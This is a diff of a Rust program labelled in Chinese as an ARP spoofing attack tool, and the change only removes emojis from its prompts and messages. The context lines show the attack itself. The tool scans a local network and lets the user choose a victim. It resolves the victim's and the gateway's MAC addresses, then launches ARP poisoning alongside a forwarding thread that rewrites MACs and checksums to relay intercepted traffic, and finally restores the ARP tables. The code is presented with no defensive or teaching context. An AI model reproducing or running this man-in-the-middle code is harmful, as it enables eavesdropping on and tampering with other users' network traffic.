@@ -136,7 +136,7 @@ fn arp_ping(
 // =========================================================================
 
 fn main() {
-    println!("=== 🧠 ARP 欺骗攻击工具 ===\n");
+    println!("=== ARP 欺骗攻击工具 ===\n");
 
     let interfaces = datalink::interfaces();
     for (i, iface) in interfaces.iter().enumerate() {
@@ -146,7 +146,7 @@ fn main() {
         );
     }
 
-    print!("\n👉 请选择要使用的接口编号: ");
+    print!("\n请选择要使用的接口编号: ");
     io::stdout().flush().unwrap();
     let mut input = String::new();
     io::stdin().read_line(&mut input).unwrap();
@@ -159,7 +159,7 @@ fn main() {
     };
 
     println!(
-        "\n✅ 使用接口: {}  MAC: {}  IP: {}\n",
+        "\n使用接口: {}  MAC: {}  IP: {}\n",
         interface.name, my_mac, my_ip
     );
 
@@ -192,10 +192,10 @@ fn main() {
     let mask = (0xFFFFFFFFu32) << (32 - prefix);
     let base = u32::from(cidr_v4) & mask; 
     let gateway_ip = Ipv4Addr::from(base + 1);
-    println!("🌐 猜测网关地址: {}\n", gateway_ip);
+    println!("猜测网关地址: {}\n", gateway_ip);
 
     // --- Step 5: 扫描局域网 ---
-    println!("🔍 开始扫描局域网中的在线主机 (串行)...");
+    println!("开始扫描局域网中的在线主机 (串行)...");
     let start = Instant::now();
     let ips: Vec<Ipv4Addr> = (1..255)
         .map(|i| Ipv4Addr::from(base + i))
@@ -220,7 +220,7 @@ fn main() {
         .collect();
 
     println!(
-        "✅ 扫描完成，用时 {:.2}s，发现 {} 台设备。\n",
+        "扫描完成，用时 {:.2}s，发现 {} 台设备。\n",
         start.elapsed().as_secs_f32(),
         active_hosts.len()
     );
@@ -229,7 +229,7 @@ fn main() {
     }
 
     // --- Step 6 & 7: 用户选择目标并获取 MAC ---
-    print!("\n🎯 请输入目标主机编号或 IP: ");
+    print!("\n请输入目标主机编号或 IP: ");
     io::stdout().flush().unwrap();
     input.clear();
     io::stdin().read_line(&mut input).unwrap();
@@ -242,7 +242,7 @@ fn main() {
         target_ip = input_trim.parse::<Ipv4Addr>().unwrap_or(gateway_ip);
     };
 
-    println!("\n🎯 目标 IP: {}", target_ip);
+    println!("\n目标 IP: {}", target_ip);
 
     let target_mac = get_mac(
         interface, 
@@ -261,7 +261,7 @@ fn main() {
     ).expect("无法获取网关 MAC");
 
     println!(
-        "✅ 获取完毕：\n - 目标 {} → {}\n - 网关 {} → {}\n",
+        "获取完毕：\n - 目标 {} → {}\n - 网关 {} → {}\n",
         target_ip, target_mac, gateway_ip, gateway_mac
     );
 
@@ -271,7 +271,7 @@ fn main() {
     let r_fwd = running.clone();
     let r_main = running.clone();
 
-    println!("⚡ 开始 ARP 欺骗攻击... 按 Ctrl+C 停止。\n");
+    println!("开始 ARP 欺骗攻击... 按 Ctrl+C 停止。\n");
 
     // 1. 欺骗发送线程
     let tx_poison = tx_main.clone(); 
@@ -341,7 +341,7 @@ fn main() {
                                     eth_packet.set_source(my_mac_fwd);
                                     eth_packet.set_destination(new_dst_mac);
 
-                                    // ✨ 可选：重新计算 IPv4 校验和（避免设备丢包）
+                                    // 重新计算 IPv4 校验和（避免设备丢包）
                                     ipv4_packet.set_checksum(0);
                                     let checksum = pnet::packet::ipv4::checksum(&ipv4_packet.to_immutable());
                                     ipv4_packet.set_checksum(checksum);
@@ -375,7 +375,7 @@ fn main() {
     let _ = forwarder_handle.join(); 
 
     // --- Step 9: ARP 恢复机制 ---
-    println!("\n🧩 攻击结束，恢复 ARP 表...");
+    println!("\n攻击结束，恢复 ARP 表...");
     
     // 重新打开一个独立的发送通道用于恢复
     let (mut tx_recover, _) = match datalink::channel(interface, Default::default()).unwrap() {
@@ -397,7 +397,7 @@ fn main() {
         thread::sleep(Duration::from_millis(50));
     }
     
-    println!("✅ ARP 已恢复。程序退出。");
+    println!("ARP 已恢复。程序退出。");
     
     print!("\n--- 按 Enter 键退出程序 ---");
     io::stdout().flush().unwrap(); // 确保提示信息立即显示
